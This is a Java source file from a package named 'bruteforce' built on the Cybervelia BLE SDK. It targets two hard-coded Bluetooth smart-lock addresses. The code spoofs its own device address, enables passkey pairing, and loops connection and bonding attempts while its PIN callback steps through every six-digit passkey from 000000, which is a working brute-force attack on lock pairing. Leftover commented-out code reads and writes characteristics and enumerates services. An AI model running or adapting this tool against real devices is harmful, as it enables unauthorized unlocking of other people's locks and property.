package cybervelia.tools.bruteforce;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.UUID;

import com.fazecast.jSerialComm.SerialPort;

import cybervelia.sdk.controller.BLECharacteristic;
import cybervelia.sdk.controller.BLEService;
import cybervelia.sdk.controller.ce.CEBLEDeviceCallbackHandler;
import cybervelia.sdk.controller.ce.CEConnectionParameters;
import cybervelia.sdk.controller.ce.CEController;
import cybervelia.sdk.controller.ce.callbacks.CEAdvertisementCallback;
import cybervelia.sdk.controller.ce.callbacks.CEBondCallback;
import cybervelia.sdk.types.ConnectionTypesCommon;

public class CEConnect {
	static String target = "ea:bb:cc:11:33:12"; // old lock
	static String ntarget = "34:03:de:2b:0a:74"; // nlock
	static String ra = "aa:bb:aa:aa:dd:e0";
	static String mype = "ea:bb:cc:11:33:11";
	static String custom_ftdi = "Silicon Labs CP210x USB to UART Bridge";
	static String nordic_ftdi = "USB Serial Port";
	static String devserial = "Silicon Labs CP210x";
	static String prolific_ftdi = "pl2303";
	static byte[] spin = {48, 48, 49, 50, 51, 48}; // start with 000000
	static CEController ce = null;
	public static void main(String[] args) {
		try {
			
			// Install Advertisement Receiver Callback
			CEAdvertisementCallback adv_callback = new CEAdvertisementCallback()  {
				@Override
				public void advertisementPacket(byte[] address, byte address_type, byte scan_adv,
						byte advertisement_type, byte rssi, byte datalen, byte[] data) {
					System.out.print(scan_adv + " = " + ConnectionTypesCommon.addressToStringFormat(address) + "["+datalen+"] ");
					for(int i = 0; i < datalen; ++i)
						System.out.print(String.format("%02x ", data[i]));
					System.out.println();
				}
			};
			
			CEBLEDeviceCallbackHandler devCallback = new CEBLEDeviceCallbackHandler();
			devCallback.installAdvertisementCallback(adv_callback);
			CEBondCallback cebondcallback = new CEBondCallback() {
				
				@Override
				public byte[] getPIN() {
					/*
					System.err.println("CE-Provide 6-digit PIN Number:");
					byte[] pin = new byte[6];
					Scanner scn = new Scanner(System.in);
					String num = scn.nextLine();
					for(int i = 0; i<6; ++i)
						pin[i] = (byte) num.charAt(i);
					return pin;
					*/
					// 0 = 48
					// 9 = 57
					String upin = new String(spin);
					int ipin = Integer.parseInt(upin);
					ipin += 1;
					String fpin = String.format("%06d", ipin);
					for(int i=0; i<6; ++i)
						spin[i] = (byte) fpin.charAt(i);
					System.out.println("Trying... " + fpin);
					return spin;
				}

				@Override
				public void authStatus(int status, int peers_fault) {
					// TODO Auto-generated method stub
					
				}

				@Override
				public void bondingSucceed(int precedure) {
					System.err.println("Bond Succeed");
					
				}

				@Override
				public void bondingFailed(short error, int bond_error_src) {
					System.err.println("Bond Failed");
				}
				
				@Override
				public void peerBondDeleteError() {
					// TODO Auto-generated method stub
					
				}
				
			};
			
			devCallback.installBondCallback(cebondcallback);
			ce = new CEController(startComm(prolific_ftdi), devCallback);
			ce.sendConnectionParameters(new CEConnectionParameters());
			ce.sendBluetoothDeviceAddress("ff:55:ee:fe:4a:af", ConnectionTypesCommon.BITAddressType.STATIC_PRIVATE);
			ce.configurePairing(ConnectionTypesCommon.PairingMethods.KEYBOARD, null);
			ce.eraseBonds();
			ce.finishSetup();
			
			
			
			
			while(true)
			{
				ce.connectNow(target, ConnectionTypesCommon.AddressType.RANDOM_STATIC_ADDR);
				while(ce.isDeviceConnected())
				{
					while(!ce.isBonded())
						ce.bondNow(false);
				}
			}
			
			
			
			//ce.bondNow(false);
			
			//startDiscovery(ce);
			
			
			/*
			byte []data = new byte[31];
			short battery_level_handle = 20;
			int r = ce.readData(data, 0, 31, battery_level_handle); // read battery level
			
			System.out.println("Battery Level Response: " + r);
			System.out.println("Battery Level Data: " + ConnectionTypesCommon.bytesToHex(data));
			*/
			
			
			//ce.connectNow(trackr, ConnectionTypesCommon.AddressType.RANDOM_STATIC_ADDR);
			
			//startDiscovery(ce);
			
			
			
			
			/*
			if (ce.isDeviceConnected())
			{
				System.out.println("Bonding...");
				ce.bondNow(false);
			}
			*/
			
			/*
			while(ce.isDeviceConnected())
			{
					
					if (ce.writeData(new byte[] {6}, 0, 1, (short)16))
						System.err.println("Write Failed");
					else
						System.out.println("Write Succeeded");
					
					
					byte[] rcv = new byte[31];
					int ret = 0;
					if ((ret = ce.readData(rcv, 0, rcv.length, (short) 11)) > 0)
					{
						System.out.println("Succeed in Read - Len: " + ret);
						for(int i=0; i<ret; ++i)
							System.out.print(String.format("%02x", rcv[i])+" ");
						System.out.println();
					}
					else
						System.err.println("Read Failed");
					
					try {Thread.sleep(1000);}catch(InterruptedException iex) {}
			}
			*/
			
			
			
		}catch(IOException ex) {
			System.err.println("Exception in main catched: " + ex.getMessage());
		}
		
		System.out.println("MAIN finished");
		
	}
	
	
	
	
	
	private static String startComm(String device)
	{
		SerialPort[] sp = SerialPort.getCommPorts();
		String com_port = null;
		for(SerialPort s : sp)
		{
			System.out.println(s.getDescriptivePortName());
			 if (s.getDescriptivePortName().indexOf(device) >= 0)
			 {
				 com_port = s.getSystemPortName();
			 }
		}
		
		System.out.println("Opening: " + com_port);
		
		if (com_port == null)
		{
			System.err.println("COM Port does not exist");
			System.exit(1);
		}
		
		return com_port;
	}
	
	
	
	public static void sendData(CEController ce, short handle) throws IOException {
		byte []data = new byte[2];
		data[0] = 1;
		data[1] = 2;
		if (ce.writeData(data, 0, 2, handle))
			System.err.println("Failed to write data");
		else
			System.out.println("Write OK");
	}
	
	
	
	public static void startDiscovery(CEController ce)
	{
		if (ce.startDiscovery(true))
			System.out.println("Discovery OK");
		else
			System.err.println("Discovery Failure");
		
		BLECharacteristic foundchr = null;
		List<BLEService> services = ce.getDiscoveredServices();
		if(services != null)
		{
			for(BLEService srv : services)
			{
				System.out.print(srv.is_128bit_uuid() + " ("+srv.getServiceId()+") ");
				System.out.print(" Handle: "+srv.getHandle());
				System.out.println(" "+srv.getUUID());
				
				for(BLECharacteristic characteristic : srv.getAllCharacteristics())
				{
					if (characteristic.getValueHandle() == 14)
						foundchr = characteristic;
					
					System.out.println("\t" + characteristic.is_128bit_uuid() + " ("+ characteristic.getCharacteristicId() +") " + 
										characteristic.getUUID().toString() + 
										" (" + (characteristic.isReadEnabled() ? "R," : "") + (characteristic.isWriteCMDEnabled() ? "WCMD," : "") + (characteristic.isWriteEnabled() ? "W," : "") + (characteristic.isNotificationAuthorized() ? "N," : "") + (characteristic.isIndicationAuthorized() ? "I" : "") + ")"+
										(characteristic.isCCCDEnabled() ? " CCCD:" + String.valueOf(characteristic.getCCCDHandle()) : "") +
										" Handle: " + characteristic.getValueHandle() );
				}
			}
		}
		
	}
	
	
	
}

